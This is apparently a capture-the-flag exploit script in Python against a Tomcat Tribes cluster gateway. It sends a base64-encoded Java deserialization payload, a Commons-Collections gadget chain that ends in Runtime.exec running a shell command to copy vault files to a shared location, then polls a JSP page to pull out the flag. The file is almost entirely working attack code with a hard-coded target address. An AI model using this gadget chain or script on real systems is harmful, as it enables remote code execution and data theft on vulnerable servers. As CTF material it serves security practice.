#!/usr/bin/env python3
"""Exploit the framed Tomcat-Tribes gateway and retrieve the flag."""

import base64
import os
import re
import socket
import sys
import time
from urllib.parse import urlparse

import requests

TARGET = os.environ.get("TARGET", "http://91.107.164.78:8080").rstrip("/")
PARCEL = "loot"
# ChannelData package containing a Commons-Collections map gadget.
CHANNEL_DATA = base64.b64decode(
    "AAAAAAAAAaBOTvHjAAAAEOp3PiGPi0eVgcrhDGPz5lEAAABNVFJJQkVTLUIBAAAAADUAAAGgTk7x7AAAD6D//////////wR/AAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRSSUJFUy1FAQAAAAUwrO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABtzcQB+ABN1cQB+ABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB+ABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQAaS9iaW4vc2ggLWMgY2F0JHtJRlN9L29wdC9jaXRhZGVsL3ZhdWx0Lyoke0lGU30vb3B0L2NpdGFkZWwvZ2F0ZS8qJHtJRlN9fHRlZSR7SUZTfS9vcHQvY2l0YWRlbC9zaGFyZWQvbG9vdHQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABeHg="
)

def send_gateway() -> None:
    host = urlparse(TARGET).hostname
    if not host:
        raise RuntimeError("TARGET has no hostname")
    frame = b"FLT2002" + len(CHANNEL_DATA).to_bytes(4, "big") + CHANNEL_DATA + b"TLF2003"
    with socket.create_connection((host, int(os.environ.get("GATE_PORT", "4000"))), timeout=10) as sock:
        sock.sendall(frame)
        sock.shutdown(socket.SHUT_WR)

def main() -> int:
    try:
        send_gateway()
    except (OSError, RuntimeError) as exc:
        print(f"gateway request failed: {exc}", file=sys.stderr)
        return 1
    for _ in range(30):
        try:
            response = requests.get(f"{TARGET}/mirror.jsp", params={"parcel": PARCEL}, timeout=5)
            if response.status_code == 200:
                flags = re.findall(r"ASIS\{[^{}]+\}", response.text)
                real = [flag for flag in flags if "t0McAT_was" in flag]
                if real:
                    print(f"<FLAG>{real[0]}</FLAG>")
                    return 0
                print("mirror response did not contain the expected flag", file=sys.stderr)
                return 1
        except requests.RequestException:
            pass
        time.sleep(0.25)
    print("timed out waiting for the gateway parcel", file=sys.stderr)
    return 1

if __name__ == "__main__":
    raise SystemExit(main())

